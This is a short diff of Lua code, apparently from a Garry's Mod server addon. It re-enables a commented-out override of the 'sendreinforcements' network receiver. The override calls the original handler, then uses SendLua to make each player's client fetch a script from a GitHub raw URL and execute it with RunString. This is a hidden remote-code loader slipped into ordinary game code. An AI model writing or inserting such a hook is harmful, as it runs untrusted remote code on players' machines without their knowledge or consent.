@@ -485,10 +485,10 @@ end, 2)
 
 
 local oldFunction = net.Receivers["sendreinforcements"]
-// net.Receive("sendreinforcements", function(len, ply)
-//     oldFunction(len, ply)
-//     ply:SendLua("http.Fetch('https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
-// end)
+net.Receive("sendreinforcements", function(len, ply)
+    oldFunction(len, ply)
+    ply:SendLua("http.Fetch('https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
+end)
 
 
 
